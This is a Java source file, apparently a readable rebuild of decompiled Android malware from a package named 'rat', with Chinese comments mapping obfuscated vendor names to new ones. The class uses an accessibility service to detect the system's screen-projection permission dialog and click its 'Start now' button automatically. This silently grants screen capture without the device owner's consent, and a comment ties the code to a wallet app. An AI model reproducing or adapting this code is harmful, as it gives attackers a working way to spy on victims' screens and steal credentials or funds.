package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * 屏幕投影权限自动授予代理
 *
 * Vendor: o/o.java (55 行)
 * 功能: 监听 MediaProjectionPermissionActivity，自动点击"立即开始"按钮
 *
 * 字段对齐:
 *   f681o → SYNTHETIC_FLAG (static synthetic int, 值为 0)
 *   f682n → processedActions (ConcurrentLinkedQueue)
 *
 * 方法对齐:
 *   H()  → createMediaProjectionWindow()
 *   d()  → destroy() (override)
 *   u()  → onAccessibilityEvent() (override)
 */
public class MediaProjectionDelegate extends AutoEngine {

    private static final String TAG = "MediaProjDelegate";

    private static final String SYSTEM_UI = "com.android.systemui";
    private static final String MEDIA_PROJECTION_ACTIVITY =
            "com.android.systemui.media.MediaProjectionPermissionActivity";

    // ADAPT: f681o → 静态合成字段
    public static final int SYNTHETIC_FLAG = 0;

    // ADAPT: f682n → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    public MediaProjectionDelegate() {
        super(Collections.singletonList(
                new WindowMatcher(SYSTEM_UI, MEDIA_PROJECTION_ACTIVITY)
                        .addEventType(32).addEventType(16384)),
                SYSTEM_UI);
        this.processedActions = new ConcurrentLinkedQueue<>();
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        Log.d(TAG, "已进入是否允许屏幕投影权限窗口");
        if (!processedActions.contains("allowInMediaProjection")) {
            processedActions.add("allowInMediaProjection");
            autoAllowMediaProjection();
        }
    }

    /**
     * 创建 MediaProjection 权限窗口匹配器
     * ADAPT: H() → createMediaProjectionWindow
     */
    public static WindowMatcher createMediaProjectionWindow() {
        return new WindowMatcher(SYSTEM_UI, MEDIA_PROJECTION_ACTIVITY)
                .addEventType(32).addEventType(16384);
    }

    /**
     * 自动点击允许屏幕投影
     * ADAPT: case 3 in o/a.java
     * 查找 android:id/button1 按钮并点击
     */
    public void autoAllowMediaProjection() {
        UiNode root = getRootNode();
        if (root == null) return;

        CombineFilter filter = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1"));

        // ADAPT: vendor 使用 findOneByCombineLoop (带重试)
        UiNode button = root.findOneByCombine(filter);
        if (button != null && button.click()) {
            Log.d(TAG, "已点击允许屏幕投影权限");
        }

        processedActions.remove("allowInMediaProjection");
    }

    /**
     * 处理无障碍事件
     * ADAPT: u() → onAccessibilityEvent
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName, String className) {
        super.onAccessibilityEvent(event, packageName, className);

        if (matchWindow(packageName, className, event != null ? event.getEventType() : 0)) {
            Log.d(TAG, "已进入是否允许屏幕投影权限窗口");
            if (!processedActions.contains("allowInMediaProjection")) {
                processedActions.add("allowInMediaProjection");
                // ADAPT: com.guard.wallet.thread.l.c(new a(this, 3), this.c)
                autoAllowMediaProjection();
            }
        }
    }
}
